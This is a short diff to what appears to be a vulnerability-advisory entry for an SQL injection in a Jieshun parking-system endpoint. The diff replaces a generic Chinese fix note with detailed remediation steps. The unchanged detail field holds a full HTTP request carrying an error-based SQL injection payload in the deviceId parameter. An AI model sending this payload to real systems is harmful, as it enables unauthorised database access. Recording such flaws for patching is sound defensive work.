@@ -6,7 +6,7 @@ version = ""
 detail = """POST /mobile/Remote/GetParkController HTTP/1.1 Host: target Content-Type: application/x-www-form-urlencoded
 
 deviceId=1'and/**/extractvalue(1,concat(char(126),database()))and'"""
-fix = "升级至最新版本"
+fix = "联系捷顺厂商获取 TVD-2026-XXXXX 安全补丁；对 deviceId 参数实施参数化查询；限制该接口仅允许内网访问；WAF 拦截 SQL 注入特征。"
 date = 20260101
 label = "nday"
 cve = "TVD-2026-XXXXX"
